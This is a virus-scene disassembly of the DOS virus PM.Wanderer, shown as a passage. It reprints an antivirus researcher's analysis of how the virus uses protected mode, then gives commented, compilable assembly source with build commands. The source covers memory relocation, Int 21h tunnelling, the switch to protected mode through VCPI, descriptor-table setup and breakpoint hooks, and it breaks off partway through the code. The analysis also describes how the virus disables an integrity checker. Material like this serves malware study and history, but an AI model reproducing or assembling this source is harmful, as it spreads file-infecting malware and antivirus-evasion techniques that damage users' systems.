   ;
   ;                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                            ³    PM.Wanderer    ³
   ;                            ³  Disassembled by  ³
   ;                            ³      Tcp/29A      ³
   ;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ; This is one of the very few DOS viruses which use protected  mode in order
   ; to perform its functioning  and the  first  to do it in a pretty effective
   ; way. It appears encrypted in files by means of a polymorphic engine, whose
   ; garbage generator i've kinda liked, based in a table  and a decoder of the
   ; contents of that table. This makes the engine pretty flexible as it's pos-
   ; sible to add entries to the table, being able to make the generated garba-
   ; ge much more confusing, without having to modify anything else.
   ;
   ; However the most notorious feature in this virus is the way it works under
   ; protected mode. I've included below an article written by the AVer (DrWeb)
   ; Igor Daniloff for VirusBulletin  in which  he makes a pretty good descrip-
   ; tion of  the functioning  of this part of the virus. Anyway there are some
   ; errors in the text, so i've commented them with (* *).
   ;
   ;
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ; Protected Mode Supervisor?
   ;
   ; Igor Daniloff
   ; DialogueScience
   ;
   ; Since their introductions, PCx have become increasingly complex through
   ; advances in both hardware and software. Computer viruses are also becoming
   ; more complex and intricate as their authors try to adapt them to changes
   ; in the computer environment.
   ;
   ; Now there are viruses that infect PC boot sectors of disks, DOS, Windows,
   ; Windows'95, OS/2, and Linux program files, as well as documents created in
   ; Word and Excel. Virus authors have devised stealth tecniques to help avoid
   ; detection, and anti-debugging and anti-virus mechanismes to make initial
   ; detection, then analysis more difficult. They have incorporated
   ; polymorphism in boot sectors, files, and memory to make detection more
   ; laborious and time-consuming for anti-virus designers. Since the release
   ; of i386 processors, viruses have begun to use 32-bit instructions in their
   ; codes. Some polymorphic viruses employ 32-bit operands in their decryptors.
   ;
   ; Unfortunately, viruses aim to survive and gain the upper hand under the
   ; existing conditions, using all conceivable software and hardware
   ; techniques. With the emergence of 286, and later 32-bit i386 processors,
   ; came protected (or virtual) operation mode. Thus far, virus authors have
   ; not successfully harnessed protected mode. Some have tried to master it,
   ; but their attempts have been unsuccessful because of changes with important
   ; operating system components.
   ;
   ; In 1994, the boot virus PMBS was the first to tackle protected mode, but
   ; could not cope with other applications or drivers (EMM386, Windows, OS/2)
   ; also using that mode. In the same year, viruses Evolution.2761 and
   ; Evolution.2770 succeeded in tapping part of the power of the protected
   ; mode, but only when the processor was in the real mode. These viruses
   ; replaced the actual interrupt vector table with their own interrupt
   ; descriptor table (IDT), which they loaded with IDT register. How did the
   ; Evolution viruses could use this technique in everyday life? I doubt there
   ; is a PC user who runs i386-Pentium in real mode.
   ;
   ; Although the i386 processor made its debut long ago, viruses have still
   ; failed to master its powerful protected mode. I believe that virus
   ; designers have cherished this hope for some time, and that one among them
   ; finally appears to have realized it.
   ;
   ; PM.Wanderer, apparently written in Russia, is a file infector which uses a
   ; cruide form of protected mode. It is surprisingly stable, interacting more
   ; or less correctly with other programs that utilize this mode. The name is
   ; derived from the string 'WANDERER,(c)P.Demenuk'.
   ;
   ; A resident polymorphic virus PM.Wanderer installs its resident part in the
   ; memory and toggles the processor to the protected mode, by utilizing the
   ; documented virtual control program interface (VCPI) of the extended memory
   ; supervisor (EMS, EMM386).
   ;
   ;
   ; Installation
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ; On starting an infected program, the virus polymorphic decryptor decodes
   ; the main virus body and passes control to it. The virus code determines a
   ; location in the upper addresses of DOS memory, writes itself to this
   ; memory, and hands over control to the copy higher in memory. Then it
   ; restores the code of the infected file in the program segment (for EXE
   ; files, it also configures the addresses of relocated elements) and begins
   ; to install resident component.
   ;
   ; First, the virus checks whether there is an extended memory manager (EMS)
   ; in the system. It does this by retrieving the address of Int 67h (Extended
   ; Memory) though Int 21h function AX=3567h (Get Interrupt Vector), and
   ; checking whether the characters 'EM' exist in EMS header. Then the virus
   ; verifies whether its resident part is already installed by calling function
   ; AX=BABAh of Int 21h and locking for the answer AX=FA00h.
   ;
   ; If there is no active EMM in the system, or the resident part of the virus
   ; is already installed (and in subsequent operation, if there is no VCPI or
   ; an error occurs installing the resident copy), the virus frees the memory
   ; reserved for installing the resident copy and passes control to the host
   ; program. This completes the life cycle of the virus in a system. However,
   ; if environmental conditions are favourable, the virus intercepts Int 01h
   ; and traces Int 21h looking, for the word 9090h (two NOPs) in the original
   ; Int 21h handler code of MS DOS version 5.00-7.00.
   ;
   ; If this string is detected, the virus retrieves from a specific handler
   ; address the address of Int 21 handler kernel, which is usually located in
   ; the high memory area, and writes this address to its body. This address is
   ; subsequently used by the virus for calling the Int 21h handler kernel for
   ; infecting files.
   ;
   ; Then the virus verifies the presence of VCPI and reserves the physical
   ; addresses of four memory pages. IT next retrieves the address of VCPI, page
   ; table, and the addresses of GDT (Global Descriptor Table. This consists of
   ; three elements: the first is the code segment descriptor, and the other two
   ; are used by the VCPI driver). The virus writes a reference to the pages
   ; allotted by the VCPI driver to the page table, and retrieves the physical
   ; address of the memory page of the segment in which the virus is currently
   ; located. It also gets GDT and IDT registers. Next, the virus creates three
   ; (code and data) descriptors and a descriptor for the task state segment
   ; (TSS) in GDT.
   ;
   ; Finally, it prepares the values for the registers CR3, GDTR, IDTR, LDTR
   ; (Local Descriptor Table Register), TR (Task Register), and the address
   ; CS:EIP of the protected mode entry point. Using the VCPI tools, the virus
   ; toggles the processor to protected mode with the highest privilege level,
   ; known as the supervisor.
   ;
   ; In the protected mode, the virus corrects IDT (* corrects GDT *) by creating
   ; two segment descriptors, then searches for the TSS descriptor (* searches for
   ; page table *). Next the virus defines two breakpoints: one at the first byte
   ; of the code of the current INT 21h handler (0000:0084h) and the other at
   ; the first byte of the code in BIOS at 0FE00:005Bh (linear address 0FE05Bh).
   ; The BIOS location usually holds the 'near jump to reboot'. The virus then
   ; corrects IDT to set debug exceptions at Int 01h and Int 09h. It also defines
   ; two handler descriptors: trap gate and interrupt gate.
   ;
   ; After these preliminaries, the virus writes its code to the memory page and
   ; switches the processor back to the virtual mode in order to free the DOS
   ; memory in upper addresses and to return the control to the infected
   ; program. From this instant, the infected program begins its "normal" work,
   ; but Int 01h and Int 09h have been redefined by the virus as trap gate and
   ; interrupt gate in protected mode, respectively.
   ;
   ;
   ; Keyboard Handler
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; On receiving control, the virus-defined Int 09h handler verifies whether
   ; the two virus-defined breakpoints exist, and restores them if either has
   ; been zeroed. Using the register DR7, the virus checks whether the two
   ; breakpoints (0 and 1) are defined, without verifying their linear
   ; addresses. If either of the breakpoints is missing, the virus calls the
   ; procedure that instantly restores them to their initial status. The
   ; virus-defined Int 09h handler also keeps a close watch on the pressing of
   ; Ctrl-Alt-Del and `resets' all breakpoints when this key combination is
   ; used.
   ;
   ; Debug Exceptions Handler The virus-defined debug exceptions handler
   ; verifies whether either of the virus breakpoints has been reached by
   ; checking the command address. If control passed to this handler from the
   ; 'near jump to reboot' in BIOS, the virus resets all breakpoints just as the
   ; virus-defined keyboard handler does when the key combination Ctrl-Alt-Del
   ; is pressed.
   ;
   ; If the exception was caused by the breakpoint of the original DOS Int 21h
   ; handler, the virus analyzes the AX register to determine the function of
   ; Int 21h, and behaves accordingly. Prior to analyzing this, the virus sets
   ; the resume flag (RF=1) in the stack's EFLAGS register that is intended to
   ; return control to the breakpoint. This flag is set should a debug exception
   ; take place while returning control to the breakpoint.
   ;
   ; If Int 21h is called with AX=0BABAh, the virus the virus recognizes this as
   ; its 'Are you there?' call. If PM.Wanderer is installed it writes writes the
   ; value 0FACCh in the AX register and returns control to the original DOS Int
   ; 21h handler. On exiting from the DOS handler, the AL register is set to
   ; zero. The register value AX=0FA00h informs the non-resident virus that a
   ; copy is already active.
   ;
   ; If Int 21h is called with either AX=4B00h (start program) or AH=3Dh and the
   ; lower 4 bits of AL set to zero (open file for reading), the virus decides
   ; to infect. The virus writes its code to 9000:0000h (linear address 90000h),
   ; prepares a stack, and toggles the processor to 8086 virtual mode with IRETD
   ; command at third and last privilege level.
   ;
   ;
   ; File Infection
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; In virtual mode, the virus code verifies the last two characters (OM or XE)
   ; of the filename extension, creates a polymorphic copy, and infects files
   ; longer than 4095 bytes. PM.Wanderer does not infect a files if seconds
   ; field of file's time-stamp is 34, assuming that the file is already
   ; infected, assuming the file is already infected, nor does the virus alter
   ; file attributes. Therefore read only files are not infected. Further, the
   ; virus does not infect a particular program with seven-character filename. I
   ; could not find the name of this file: the virus defines it implicitly by
   ; computing the CRC of itss name.
   ;
   ; The virus does not take over Int 24h (Critical Error Handler), so when
   ; critical errors (for example, writing to write-protected disks) occur
   ; during infection, the standard DOS query - Retry, Ignore, Fail, Abort? - is
   ; displayed. The virus infects a file by calling the DOS Int 21h handler
   ; directly, using the address obtained from tracing Int 21h at installation.
   ; The virus code is prepended to the header of COM files and inserted into
   ; the middle of EXE files, immediately below the header. Prior to this, the
   ; relocations field in the header is zeroed by moving the original program
   ; code to the file end. The `real working code' of the virus is 3684 bytes
   ; long, but the size of infected files increases by more than 3940 bytes.
   ; (* exactly between 3940 and 4036 bytes: 3684 + decryptor (256 to 352) *)
   ;
   ;
   ; Exit from the V-mode of DOS-machine
   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; The virus uses a smart technique to exit the V-mode and to transfer control
   ; to the breakpoint of the DOS Int 21h handler that called the debug
   ; exceptions, so that DOS functions normally. Were the virus to infect a file
   ; while in P-mode, everything would be simple - it would be sufficient to
   ; execute the IRETD command. Since the virus has toggled to the V-mode with
   ; privilege level three, it is possible for the debug exceptions handler to
   ; switch back to P-mode. Therefore, the virus plays an elegant trick to
   ; surmount the situation.
   ;
   ; If an error occurs during infection or while exiting from the virtual mode,
   ; the virus calls Int 21h with AX=4B00h. When Int 21h is called with
   ; AX=4B00h, control jumps to the first command of the DOS Int 21h handler.
   ; This command contains a virus-defined breakpoint. Control must now be
   ; transferred to the debug exceptions handler in P-mode. However, the V-mode
   ; monitor discovers the need to process the next debug exception. The point
   ; is that the virus debug exceptions handler has not returned the control to
   ; the breakpoint and is still busy processing the current debut exception.
   ; Therefore, the V-mode monitor terminates the Int 21h call, aborts
   ; processing the current debug exception, and returns control to the
   ; breakpoint with the values stored in the registers of the previous Int 21h
   ; call.
   ;
   ;
   ; Payload
   ; ÄÄÄÄÄÄÄ
   ; If the debug exceptions handler is passed AX=3506h (such a call for getting
   ; the INT 06 address usually exists in all programs compiled from high-level
   ; languages, such as C, Pascal), PM.Wanderer scans the linear address space
   ; 0-90000h looking for a string that obviously belongs to the Russian
   ; integrity checker ADinf. If this string is found, the virus modifies it in
   ; order to disable the alerts ADinf usually raises on detecting changes to
   ; files and disks.
   ;
   ; Search for the Virus in Memory: It is clear from the above that conventional
   ; memory scanning methods are incapable of detecting the resident copy of the
   ; virus at level zero privilege in the protected mode. The resident copy can
   ; be detected only after toggling to the highest privilege level of protected
   ; mode with the help of GDT or IDT. However, this virus can be trapped by
   ; other conventional methods. Here, the linear addresses of the first two
   ; breakpoints (0 and 1) must be determined and compared with the values
   ; described above. The possible presence of PM.Wanderer in the memory can be
   ; decided from theese addresses. It is imperative that such operations be
   ; carried out only in a DOS session. In assembler language, this can be done
   ; as follows:
   ;
   ;
   ;     .8086
   ;     MOV AX,0BABAH            ;simulate that the virus is checking its
   ;     INT 21H                  ;presence in the memory
   ;     CMP AX,0FA00H            ;did the resident copy respond?
   ;     JNE ExitCheckMemory
   ;     .386P
   ;     MOV EAX,DR7              ;read register DR7
   ;     AND EAX,20AH
   ;     CMP EAX,20AH             ;are 2 breakpoints defined?
   ;     JNE ExitCheckMemory
   ;     MOV EAX,DR1              ;read linear address of breakpoint 1
   ;     CMP EAX,0FE05BH          ;is it set at 0FE00:005BH in BIOS?
   ;     JNE ExitCheckMemory
   ;     .8086
   ;     MOV AH,9
   ;     MOV DX,OFFSET VirusIsFound
   ;     INT 21H                  ;alert about the possible presence of
   ;     CLI                      ;virus in the memory
   ;     JMP $+0                  ;"hang up" system
   ;ExitCheckMemory:
   ;     INT 20H                  ;terminate operation
   ;
   ;
   ; Test
   ; ÄÄÄÄ
   ; After infecting several thousand files, the virus behaves like a 'lodger'
   ; with all infected files remaining operative. A file becomes inoperative
   ; only if, after infection, its stack are located within the virus code.
   ; While infecting EXE files, PM.Wanderer does not modify the start SS:SP
   ; values in the EXE header. As already mentioned, the virus is capable of
   ; reproduction only if EMS (EMM386) is installed in the system. If EMM386 is
   ; installed with the /NOEMS option, when the virus toggles processor to
   ; protected mode, the system will reboot. The computer may also reboot if
   ; QEMM386 is installed.
   ;
   ; The virus loses its reproduciability under Windows 3.1x and Windows 95.
   ; These operating systems cut off an already resident PM.Wanderer, because
   ; while loading they install their own handlers in IDT and zero all
   ; breakpoints. Prior to terminating a session and returning to DOS, Windows
   ; restores the previous status of the interrupt descriptor table. On pressing
   ; a key in DOS environment, the virus gets control, installs its own
   ; breakpoints, and continues its activities. Due to the absence of VCPI in a
   ; DOS session within Windows, the virus cannot return to the protected mode
   ; there. For the same reason, the virus is also inoperative under OS/2.
   ;
   ;
   ; Conclusion
   ; ÄÄÄÄÄÄÄÄÄÄ
   ; PM.Wanderer is the first virus to utilize i386 the protected mode and not
   ; conflict with the domimamt Microsoft operating systems, which also use that
   ; mode. It is possibly that future viruses may completely overwrite the
   ; supervisor with their own code supporting the DPMI, EMS/VCPI, XMS, and Int
   ; 15h extended memory interfaces. Who knows?
   ;
   ;
   ;                               PM.Wanderer
   ;  Aliases:                     None known
   ;  Type:                        Memory resident in P-mode, polymorphic
   ;  Infection:                   COM and EXE files
   ;  Self-recognition in
   ;  Memory:                      See description
   ;  Self-recognition in Files:   Bit 1 and bit 4 in seconds field of file's
   ;                               time-stamp set
   ;  Hex Pattern in Files:        The virus is polymorphic, and there is no
   ;                               useful hex pattern.
   ;  Hex Pattern in Memory:       Virus works in P-mode, see description
   ;  Intercepts:                  In IDT: Int 09h for enabling breakpoints,
   ;                               Int 1 for infection
   ;  Payload:                     Patch the integrity checker ADinf in
   ;                               memory.
   ;  Removal:                     Under clean system conditions, identify
   ;                               and replace infected files
   ;
   ; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
   ;
   ;
   ; Other data
   ; ÄÄÄÄÄÄÄÄÄÄ
   ; Virus     : PM.Wanderer
   ; Size      : 3684 (code) + 256-352 (decryptor) = 3940-4036 bytes
   ; Author    : P. Demenuk
   ; Origin    : Russia
   ; Disasm by : Tcp/29A
   ;
   ;
   ; Greetings
   ; ÄÄÄÄÄÄÄÄÄ
   ; They go this time to l- (i got it) ;), and to Vecna/29A, as he was working
   ; in the same project at the same time, without any of we both having reali-
   ; sed about that fact :) I noticed it also happened the same to him with the
   ; Dementia disassembly... that's bad luck, man! :)
   ;
   ; Send any question or comment to tcp@cryogen.com.
   ;
   ;
   ; Compiling it
   ; ÄÄÄÄÄÄÄÄÄÄÄÄ
   ; tasm /m wanderer.asm (ignore warnings, if any)
   ; tlink /t /3 wanderer (ignore fixup overflow errors)


                   .386p   ; Of course, 386 protected mode
   wanderer        segment byte public 'CODE' use16
                   assume  cs:wanderer, ds:data0, es:data0, ss:data0
                   org     100h

   ; Selectors :
   CODE_SEL        =       8       ; CS Selector
   DATACS_SEL      =       10h     ; CS Alias Selector
   ALLMEM_SEL      =       18h     ; 4GB Memory Selector
   TSS_SEL         =       28h     ; TSS Selector
   VCPICS_SEL      =       30h     ; VCPI CS Selector

   VIRUS_SIZE      =       virus_end - start
   STACK_SIZE      =       44h

   start:
           call    get_delta
   get_delta:
           pop     si
                   sub     si,3            ; Get delta offset
                   mov     di,offset(start)
           cld
           mov     ax,cs
           push    ds
           mov     ds,ax
           mov     es,ax
                   push    offset(mem_mcb)
                   mov     bx,offset(copy_code)
                   mov     word ptr [bx],0A4F2h    ; Encode 'repnz movsb'
                   mov     word ptr [bx+2],0C361h  ; Encode 'popa ; ret'
                   mov     cx,VIRUS_SIZE
           pusha
           jmp     bx

                   db      0Ah,'WANDERER,(c) P. Demenuk',0Ah

   mem_mcb:
           pop     ax
           dec     ax
                   mov     es,ax           ; ES:=MCB
                   mov     bx,es:[3]       ; Get number of paragraphs in this MCB
                   mov     ds:size_mcb,bx
           inc     ax
                   mov     es,ax           ; ES:=PSP
                   jmp     alloc_mem

   free_mem:
                   mov     bx,ds:size_mcb
                   sub     bx,600h         ; 600h*16 = 24576 bytes
           mov     ah,4Ah
                   int     21h             ; Adjust memory block size
                                           ; ES = segment addr of block to change
                       ; BX = new size in paragraphs
   alloc_mem:
                   mov     bx,500h         ; 500h*16 = 20480 bytes
           mov     ah,48h
                   int     21h             ; Allocate memory
                                           ; BX = 16-byte paragraphs desired
                   jc      free_mem        ; Error? then jmp
           mov     es,ax
           xor     di,di
           xor     si,si
                   mov     cx,2048
                   mov     ds:codesegment,cs
                   rep     movsw           ; Copy 4K to allocated memory
           push    cs
           push    ax
                   push    offset(new_mem_pos)
                   retf                    ; Jump to new copy

   new_mem_pos:
           push    cs
           pop     ds
                   cmp     ds:host_type,0  ; COM file?
                   jz      check_resident  ; Yes? then jmp
           mov     ah,62h
           int     21h             ; Get PSP address
           mov     es,bx
                   mov     es,es:[2Ch]     ; ES:=environment
           xor     di,di
           mov     cx,8000h
           mov     al,1
                   repne   scasb           ; Search for '1h' (file path)
                   inc     di              ; Current file path
           push    es
           pop     ds
           mov     ax,3D00h
           mov     dx,di
           int     21h             ; Open file (read)
           xchg    ax,bx           ; BX := handle
           pop     ds
           mov     ax,4200h
                   mov     dx,cs:filesize_l
                   mov     cx,cs:filesize_h
                   int     21h             ; Lseek end of original file
           mov     ah,3Fh
                   mov     cx,cs:size_in_file
                   xor     dx,dx
           int     21h             ; Read from file
           push    ds
           push    cs
           pop     ds
           mov     ax,4200h
                   mov     dx,ds:ofs_relocitems
           xor     cx,cx
                   int     21h             ; Lseek start of relocation table
                   mov     cx,ds:reloc_items
                   shl     cx,1            ; x2 (number of bytes in reloc. table)
           shl     cx,1
                   mov     dx,offset(buffer1)
           mov     ah,3Fh
                   int     21h             ; Read relocation table
           mov     ah,3Eh
           int     21h             ; Close file
                   mov     si,offset(buffer1)
           pop     ax
                   mov     cx,ds:reloc_items
                   jcxz    no_reloc_items  ; Any relocation item? No? then jmp
   l_reloc:
                   add     [si+2],ax       ; Relocate item in memory
           les     di,[si]
           add     es:[di],ax
           add     si,4
                   loop    l_reloc
   no_reloc_items:
                   mov     psp_seg,ax
   check_resident:
           mov     ax,3567h
           int     21h             ; Get int 67h vector
                   cmp     word ptr es:[0Ah],'ME' ; EMM386 loaded?
           push    cs
           pop     es
                   jne     exec_host       ; No? then jmp
                   mov     ax,0BABAh       ; Residency check
           int     21h
                   cmp     ax,0FA00h       ; Already resident?
                   jne     go_resident     ; No? then jmp
   free_virmem:
                   sti
   exec_host:
           mov     ah,49h
           int     21h             ; Free memory
                   cmp     ds:host_type,0  ; COM file?
                   jz      exec_com        ; Yes? then jmp
                   mov     ax,psp_seg
                   add     ax,ds:file_reloCS
                   push    ax              ; CS
                   push    ds:file_exeIP   ; IP
                   mov     ax,psp_seg
           sub     ax,10h
           mov     es,ax
           mov     ds,ax
                   jmp     restore_mcb

   exec_com:
                   mov     sp,0FFFEh       ; Set stack pointer
                   push    100h            ; IP
           pusha
                   mov     si,ds:filesize_l
                   and     si,si           ; Is the virus dropper?
                   jz      exit_program    ; Yes? then jmp
                   mov     di,100h
                   add     si,di           ; End of original file
           cld
                   mov     es,ds:codesegment
                   mov     ds,ds:codesegment
           push    es
                   push    offset(copy_code)
                   mov     cx,ds:size_in_file
   restore_mcb:
           mov     ah,4Ah
                   mov     bx,cs:size_mcb
                   int     21h             ; Restore MCB size
                   retf            ; Restore original code and return to host

   exit_program:
           mov     ax,4C00h
                   int     21h             ; Exit program

   go_resident:
                   call    encrypt_infection_routine       ; Decrypt
           call    tunnel_i21
           mov     ax,0DE00h       ; VCPI installation check
                   call    VCPI            ; Doesn't return if not installed
                   mov     saved_sp,sp
                   mov     saved_ss,ss
                   mov     di,offset(pages_4K)
                   mov     cx,4            ; Allocate 4 pages (4K per page)
   l_alloc_page:
           mov     ax,0DE04h       ; VCPI - Allocate a 4K page
                   call    VCPI
           mov     [di],edx        ; EDX = physical address of page
           scasd                   ; == add di,4
           loop    l_alloc_page
           mov     bx,cs
                   add     bx,100h         ; Align data area on page
           xor     bl,bl
           inc     bh
                   mov     es,bx           ; Base address of directory page
                   mov     ds:addr_dir_page,bx
           xor     ax,ax
           xor     di,di
                   mov     cx,(4096+4096)/2        ; 2 pages
                   rep     stosw           ; Clear directory page area (4K)
                                           ;  and page table (4K)
           mov     ax,0DE01h       ; VCPI - Get Protected Mode Interface
                       ;  ES:DI -> 4K page table buffer
                       ;  DS:SI -> three descriptor table
                       ;           entries in GDT. First
                       ;           becomes code segment
                       ;           descriptor, other two for
                       ;           use by main control prog.
                   mov     ds,bx           ; DS := segment of dir page table
                   inc     bh              ; add 100h
                   mov     es,bx           ; ES := segment of page table
           xor     di,di
                   mov     si,100h+VCPICS_SEL      ; GDT in page table + 100h
                   call    VCPI
           push    cs
           pop     ds
                   mov     ds:pm_ep,ebx    ; EBX = protected mode EP in code seg.
           xor     si,si
                   mov     cx,400h         ; 4GB, all addressable memory
                   xor     bx,bx           ; BX in [0..3FFh]
   l_entry:                                ; Map the memory in the page table
                   mov     eax,es:[si]     ; Read page table entry
                   cmp     eax,0           ; Invalid (available) entry?
                   jnz     next_page_entry ; No? then jmp
                   movzx   eax,bx          ; Page entry
                   shl     eax,0Ch         ; Page frame address
                   mov     al,67h          ; Dirty, Accessed, User, Write, Present
                   mov     es:[si],eax     ; Store page in page table
   next_page_entry:
                   add     si,4            ; Next entry
           inc     bx
                   loop    l_entry
                   mov     eax,ds:page_1   ; Map page_1 in page table
           mov     esi,eax
                   mov     al,67h          ; Dirty, Accessed, User, Write, Present
                   shr     esi,0Ah         ; Calculate page number in page table
                   mov     es:[esi],eax    ; Store page in page table
                   mov     ds:virus_cs,cs
                   call    setup_system_regs
                   sidt    qword ptr ds:IDT
                   sgdt    qword ptr ds:GDT
                   mov     esi,100h        ; GDT (addr.dir.page table + 100h)
           push    es
           pop     ds
           mov     cx,cs
           movzx   ecx,cx
                   shl     ecx,4                   ; Segment Base (CS)
                   mov     ax,CODE_SEL
                   mov     ebx,0FFFFh              ; Segment Limit (64K)
                   mov     dx,0000000010011010b    ; Access rights: Executable
                                                   ;  code, readable, present,
                                                   ;  DPL 0
           push    ecx
           push    ebx
                   call    build_descriptor
                   mov     ax,DATACS_SEL
                   pop     ebx                     ; Limit (64K)
                   pop     ecx
                   mov     dx,0000000010010010b    ; Access rights: Data, writable,
                                                   ;  present, DPL 0
                   call    build_descriptor
                   mov     ax,ALLMEM_SEL
           xor     ecx,ecx
                   mov     ebx,0FFFFFFFFh          ; Limit (4GB: granularity on)
                   mov     dx,1000000010010010b    ; Access rights: Data, writeble,
                                                   ;  present, granularity, DPL 0
                   call    build_descriptor
                   mov     ax,TSS_SEL
                   mov     cx,ds
           movzx   ecx,cx
                   shl     ecx,4                   ; Addr. directory page table
           push    ecx
                   add     ecx,10h                 ; TSS in dir.page table + 10h
                   mov     dx,0000000010001001b    ; Access rights: System, DPL 0,
                                                   ;  available 386 TSS, present
                   mov     ebx,67h                 ; Limit
                   call    build_descriptor
                   pop     ecx                     ; Addr. directory page table
                   add     ecx,100h                ; GDT in dir.page table + 100h
           push    cs
           pop     ds
                   mov     ds:base_gdt,ecx
           cli
           mov     ax,cs
           movzx   esi,ax
           mov     ax,0DE0Ch
           shl     esi,4
                   add     esi,offset(system_registers)
           int     67h     ; VCPI - Switch to protected mode
                   ; ESI = linear address in first megabyte of
                                   ;       values for system registers
                   ; Return: interrupts disabled
                   ;         GDTR, IDTR, LDTR, TR loaded
                   jmp     $


   ofs_i1          dw      0
   seg_i1          dw      0
   save_ss         dw      0
   save_sp         dw      0


   int_1:
           push    bp
           push    ds
           push    si
           mov     bp,sp
                   lds     si,[bp+6]               ; Get return address from stack
                   cmp     word ptr [si],9090h     ; NOP+NOP? (int 21h entry point)
                   je      found_i21_entry         ; Yes? then jmp
           pop     si
           pop     ds
           pop     bp
           iret

   tunnel_i21:
           mov     ax,3501h
           int     21h             ; Get int 1h vector (trace)
                   mov     ds:ofs_i1,bx
                   mov     ds:seg_i1,es
           mov     dx,offset(int_1)
           mov     ah,25h
           int     21h             ; Set new int 1h
           push    cs
           push    cs
                   mov     ds:save_ss,ss   ; Save stack
                   mov     ds:save_sp,sp
           cld
           pushf
           pushf
           pop     ax              ; Read flags
           or      ax,100h         ; Set bit trace on
           push    ax
           xor     ax,ax
           mov     ds,ax           ; DS := 0
           mov     ah,30h          ; Get DOS version
           push    cs
           pop     es
           popf                    ; Activate int 1h tunneler
                   call    dword ptr ds:[21h*4]
                   pop     es
           xor     ax,ax
           mov     ds,ax           ; DS := 0
           mov     di,offset(ofs_i21)
           mov     si,21h*4
           movsw
           movsw
           pop     ds
           push    cs
           jmp     restore_i1

   found_i21_entry:
                   mov     ss,cs:save_ss   ; Restore stack
           mov     sp,cs:save_sp
           mov     si,[si+8]
                   lodsw                   ; Store int 21h entry point
           mov     cs:ofs_i21,ax
           lodsw
           pop     ds
                   mov     ds:seg_i21,ax
   restore_i1:
           xor     ax,ax
           mov     es,ax           ; ES := 0
           mov     di,1h*4
                   mov     si,offset(ofs_i1)
                   movsw                   ; Restore int 1h
           movsw
           pop     es
           ret

   ; PM Entry point
   pm_entry_point:
                   mov     ax,DATACS_SEL
                   mov     ss,ax                   ; Stack descriptor
                   mov     sp,offset(_stack)
                   mov     es,ax                   ; Extra data descriptor
                   mov     ax,ALLMEM_SEL
                   mov     ds,ax                   ; Data descriptor
                   mov     esi,es:GDT_base
                   movzx   ecx,es:GDT_limit
                   inc     ecx                     ; First entry unused
                   shr     ecx,3                   ; Number of entries in GDT
           xor     bx,bx
           xor     eax,eax
   l_next_gdt_entry:
                   add     esi,8                   ; Next descriptor
                   add     bx,00001000b            ; Next selector
                   cmp     eax,[esi+4]             ; Available entry?
                   jne     next_gdt_entry          ; No? then jmp
                   mov     es:virus_selector,bx
                   mov     ebx,0FFFh               ; Limit 4K
                   mov     ecx,es:page_1
                   mov     dx,0000000010011011b    ; Access rights: Code, Readable,
                                                   ;  present, accessed, DPL 0
                   call    build_descriptor
                   add     esi,8                   ; Next descriptor
           xor     ecx,ecx
                   mov     ebx,0FFFFFFFFh          ; Limit (4GB : granurality on)
                   mov     dx,1000000010010010b    ; Access rights: Data, Writable,
                                                   ;  present, DPL 0
                   call    build_descriptor
                   jmp     search_pagetable

   next_gdt_entry:
                   loop    l_next_gdt_entry
   no_descriptor:
                   jmp     no_descriptor   ; Descriptor not found in GDT

   search_pagetable:
                   mov     esi,1024*1024           ; 1MB
   l_search_pagetable:
                   add     esi,4*1024              ; 4KB (a page)
                   cmp     dword ptr [esi],67h     ; Page for address 0 ?
                   jne     l_search_pagetable      ; No? then jmp
                   cmp     dword ptr [esi+4],1067h ; Page for address 4096 ?
                   jne     l_search_pagetable      ; No? then jmp
                   mov     es:pagetable,esi
                   movzx   eax,word ptr ds:[21h*4] ; Get int 21h vector
                   movzx   ebx,word ptr ds:[21h*4+2]
                   shl     ebx,4                   ; Calculate physical address
           add     eax,ebx
                   mov     es:i21h_ep,eax          ; Save old int 21h
                   call    set_breakpoints
                   mov     es:infecting,0          ; Flag: can infect files
                   mov     eax,es:page_1           ; Insert vir page in page table
           mov     ebx,eax
           mov     al,67h
           shr     ebx,0Ah
           mov     [esi][ebx],eax
                   mov     di,offset(orig_i1)
                   mov     ecx,1                   ; Int 1h (trace)
                   mov     ax,offset(pm_int_1)
                   call    build_idt_descriptor
                   add     di,6                    ; offset(orig_i9)
                   mov     ecx,9                   ; Int 9h
                   mov     ax,offset(pm_int_9)
                   call    build_idt_descriptor
           push    es
           push    ds
           pop     es
           pop     ds
           xor     esi,esi
                   mov     edi,ds:page_1
           cld
                   mov     ecx,1024
                   db      0F3h,66h,67h,0A5h       ; rep movsd (TASM FIX)
                                                   ; Copy (4k) to virus page
                   movzx   eax,saved_sp
                   mov     bx,ds:virus_cs
           push    cx
                   push    bx                      ; GS
           push    cx
                   push    bx                      ; FS
           push    cx
                   push    bx                      ; DS
           push    cx
                   push    bx                      ; ES
           push    cx
                   push    saved_ss                ; SS
           push    es
           push    ds
           pop     es
           pop     ds
                   push    eax                     ; ESP
                   pushfd                          ; Flags
           push    cx
                   push    bx                      ; CS
           push    0
                   push    offset(free_virmem)     ; EIP
           movzx   esp,sp
                   mov     ax,0DE0Ch       ; Switch to protected mode (v86 mode)
                   call    fword ptr cs:pm_ep


   pm_int_9:
           push    eax
           mov     eax,dr7
                   and     ax,0000001100001010b    ; Check breakpoints
                   cmp     ax,0000001100001010b    ; Removed?
                   je      check_ctrlaltdel        ; No? then jmp
                   call    set_breakpoints         ; else restore them
   check_ctrlaltdel:
                   in      al,60h          ; Read scan code from keyboard
                   cmp     al,53h          ; DEL key?
                   jne     exit_pm9        ; No? then jmp
                   call    set_ds
                   mov     al,ds:[417h]    ; Get keyboard status (0:417h)
                   and     al,0Ch
                   cmp     al,0Ch          ; CTRL & ALT pressed?
                   jne     exit_pm9        ; No? then jmp
                   xor     eax,eax
                   mov     dr7,eax         ; Remove breakpoints if reset
   exit_pm9:
           pop     eax
                   jmp     fword ptr cs:orig_i9

   exit_pm1:
           pop     eax
                   jmp     fword ptr cs:orig_i1


   pm_int_1:
           push    eax
